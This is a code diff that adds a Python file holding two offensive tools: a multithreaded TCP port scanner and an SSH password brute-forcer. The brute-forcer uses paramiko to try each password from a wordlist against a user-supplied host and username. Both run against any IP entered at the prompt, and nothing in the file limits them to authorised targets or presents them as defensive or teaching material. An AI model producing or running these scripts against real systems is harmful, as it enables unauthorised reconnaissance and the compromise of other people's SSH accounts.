@@ -1,0 +1,72 @@
+import socket
+from threading import Thread
+
+# Function to scan ports
+def scan_port(host, port):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        socket.setdefaulttimeout(1)
+        result = s.connect_ex((host, port))
+        if result == 0:
+            print(f"[+] Port {port} is open on {host}")
+        s.close()
+    except Exception as e:
+        print(f"[!] Error scanning port {port}: {e}")
+
+# Function to scan a range of ports using threading
+def scan_ports(host, port_range):
+    print(f"\n[*] Scanning {host} for open ports in range {port_range}")
+    threads = []
+    for port in range(port_range[0], port_range[1]):
+        thread = Thread(target=scan_port, args=(host, port))
+        thread.start()
+        threads.append(thread)
+
+    for thread in threads:
+        thread.join()
+
+# Main function
+if __name__ == "__main__":
+    target_host = input("Enter target host IP: ")
+    port_range_start = int(input("Enter starting port number: "))
+    port_range_end = int(input("Enter ending port number: "))
+    scan_ports(target_host, (port_range_start, port_range_end))
+
+
+
+
+
+
+import paramiko
+
+# Brute-forcer function
+def brute_force_ssh(host, username, wordlist):
+    print(f"\n[*] Attempting brute force on {host} with username: {username}")
+    for password in wordlist:
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(host, username=username, password=password)
+            print(f"[+] Login successful with password: {password}")
+            ssh.close()
+            return
+        except paramiko.AuthenticationException:
+            print(f"[-] Failed login attempt with password: {password}")
+        except Exception as e:
+            print(f"[!] Error: {e}")
+    print("[✓] Brute-forcing attempt complete.")
+
+# Main function
+if __name__ == "__main__":
+    target_host = input("Enter target host IP: ")
+    username = input("Enter username: ")
+    wordlist_file = input("Enter path to wordlist file: ")
+
+    # Load wordlist
+    try:
+        with open(wordlist_file, "r") as file:
+            wordlist = file.readlines()
+        wordlist = [word.strip() for word in wordlist]
+        brute_force_ssh(target_host, username, wordlist)
+    except FileNotFoundError:
+        print(f"[!] Wordlist file '{wordlist_file}' not found.")
